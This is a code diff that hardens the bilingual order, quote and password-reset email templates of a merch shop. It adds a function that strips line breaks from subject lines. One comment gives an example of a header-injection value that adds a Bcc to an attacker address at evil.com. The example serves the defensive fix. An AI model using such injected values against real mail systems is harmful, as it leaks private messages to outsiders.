@@ -52,6 +52,18 @@ function firstNameText(full: string | undefined | null): string {
   return (full ?? '').split(' ')[0] ?? '';
 }
 
+// Subject lines flow straight into RFC-5322 headers via whatever sender
+// we wire up (Resend/Postmark/Shopify Email). A CR or LF embedded in an
+// interpolated value (a quoteNumber or orderNumber pulled from an admin
+// note, a vendor-uploaded reference) would let an attacker inject extra
+// headers — `\r\nBcc: leak@evil.com` is the textbook case. Most senders
+// reject this, but not all, and the cost of stripping is zero. Also
+// collapse any internal whitespace runs and trim — multi-line subjects
+// render as gibberish in inboxes regardless.
+function safeSubject(s: string): string {
+  return s.replace(/[\r\n\t]+/g, ' ').replace(/\s{2,}/g, ' ').trim();
+}
+
 // Currency formatting was duplicated in three places (quote, payment,
 // order-confirmation) each spelling out the locale tuple and the CAD
 // options object. Lifted here so the locale + currency code are tuned
@@ -117,7 +129,7 @@ export function quoteSentEmail(ctx: QuoteSentCtx): EmailOutput {
 
   if (lang === 'en') {
     return {
-      subject: `Your custom quote from Vision Affichage — ${ctx.quoteNumber}`,
+      subject: safeSubject(`Your custom quote from Vision Affichage — ${ctx.quoteNumber}`),
       html: wrap(`
         <h1 style="font-size:22px;margin:0 0 12px;">Hi ${firstName(ctx.clientName)},</h1>
         <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -137,7 +149,7 @@ export function quoteSentEmail(ctx: QuoteSentCtx): EmailOutput {
   }
 
   return {
-    subject: `Ta soumission personnalisée Vision Affichage — ${ctx.quoteNumber}`,
+    subject: safeSubject(`Ta soumission personnalisée Vision Affichage — ${ctx.quoteNumber}`),
     html: wrap(`
       <h1 style="font-size:22px;margin:0 0 12px;">Bonjour ${firstName(ctx.clientName)},</h1>
       <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -173,7 +185,7 @@ export function paymentConfirmationEmail(ctx: PaymentConfirmationCtx): EmailOutp
 
   if (lang === 'en') {
     return {
-      subject: `Payment received · Order ${ctx.orderNumber}`,
+      subject: safeSubject(`Payment received · Order ${ctx.orderNumber}`),
       html: wrap(`
         <h1 style="font-size:22px;margin:0 0 12px;">Thanks ${firstName(ctx.clientName)} — we got it!</h1>
         <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -192,7 +204,7 @@ export function paymentConfirmationEmail(ctx: PaymentConfirmationCtx): EmailOutp
   }
 
   return {
-    subject: `Paiement reçu · Commande ${ctx.orderNumber}`,
+    subject: safeSubject(`Paiement reçu · Commande ${ctx.orderNumber}`),
     html: wrap(`
       <h1 style="font-size:22px;margin:0 0 12px;">Merci ${firstName(ctx.clientName)} — on l'a reçu !</h1>
       <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -227,7 +239,7 @@ export function orderShippedEmail(ctx: OrderShippedCtx): EmailOutput {
 
   if (lang === 'en') {
     return {
-      subject: `It's on its way · Order ${ctx.orderNumber}`,
+      subject: safeSubject(`It's on its way · Order ${ctx.orderNumber}`),
       html: wrap(`
         <h1 style="font-size:22px;margin:0 0 12px;">Your order is on the road, ${firstName(ctx.clientName)}.</h1>
         <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -245,7 +257,7 @@ export function orderShippedEmail(ctx: OrderShippedCtx): EmailOutput {
   }
 
   return {
-    subject: `C'est en route · Commande ${ctx.orderNumber}`,
+    subject: safeSubject(`C'est en route · Commande ${ctx.orderNumber}`),
     html: wrap(`
       <h1 style="font-size:22px;margin:0 0 12px;">Ta commande est en route, ${firstName(ctx.clientName)}.</h1>
       <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -276,7 +288,7 @@ export function orderDeliveredEmail(ctx: OrderDeliveredCtx): EmailOutput {
 
   if (lang === 'en') {
     return {
-      subject: `Delivered — how did we do?`,
+      subject: safeSubject(`Delivered — how did we do?`),
       html: wrap(`
         <h1 style="font-size:22px;margin:0 0 12px;">Your merch arrived, ${firstName(ctx.clientName)}.</h1>
         <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -290,7 +302,7 @@ export function orderDeliveredEmail(ctx: OrderDeliveredCtx): EmailOutput {
   }
 
   return {
-    subject: `Livré — comment on s'en est tiré ?`,
+    subject: safeSubject(`Livré — comment on s'en est tiré ?`),
     html: wrap(`
       <h1 style="font-size:22px;margin:0 0 12px;">Ton merch est arrivé, ${firstName(ctx.clientName)}.</h1>
       <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -324,7 +336,7 @@ export function orderConfirmationEmail(ctx: OrderConfirmationCtx): EmailOutput {
 
   if (lang === 'en') {
     return {
-      subject: `Vision Affichage — order confirmation #${ctx.orderNumber}`,
+      subject: safeSubject(`Vision Affichage — order confirmation #${ctx.orderNumber}`),
       html: wrap(`
         <h1 style="font-size:22px;margin:0 0 12px;">Order confirmed, ${firstName(ctx.clientName)}!</h1>
         <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -343,7 +355,7 @@ export function orderConfirmationEmail(ctx: OrderConfirmationCtx): EmailOutput {
   }
 
   return {
-    subject: `Vision Affichage — confirmation de commande #${ctx.orderNumber}`,
+    subject: safeSubject(`Vision Affichage — confirmation de commande #${ctx.orderNumber}`),
     html: wrap(`
       <h1 style="font-size:22px;margin:0 0 12px;">Commande confirmée, ${firstName(ctx.clientName)} !</h1>
       <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -380,7 +392,7 @@ export function passwordResetEmail(ctx: PasswordResetCtx): EmailOutput {
 
   if (lang === 'en') {
     return {
-      subject: `Vision Affichage — reset your password`,
+      subject: safeSubject(`Vision Affichage — reset your password`),
       html: wrap(`
         <h1 style="font-size:22px;margin:0 0 12px;">${name ? `Hi ${name},` : 'Hi there,'}</h1>
         <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
@@ -398,7 +410,7 @@ export function passwordResetEmail(ctx: PasswordResetCtx): EmailOutput {
   }
 
   return {
-    subject: `Vision Affichage — réinitialiser ton mot de passe`,
+    subject: safeSubject(`Vision Affichage — réinitialiser ton mot de passe`),
     html: wrap(`
       <h1 style="font-size:22px;margin:0 0 12px;">${name ? `Bonjour ${name},` : 'Bonjour,'}</h1>
       <p style="font-size:15px;line-height:1.6;margin:0 0 18px;">
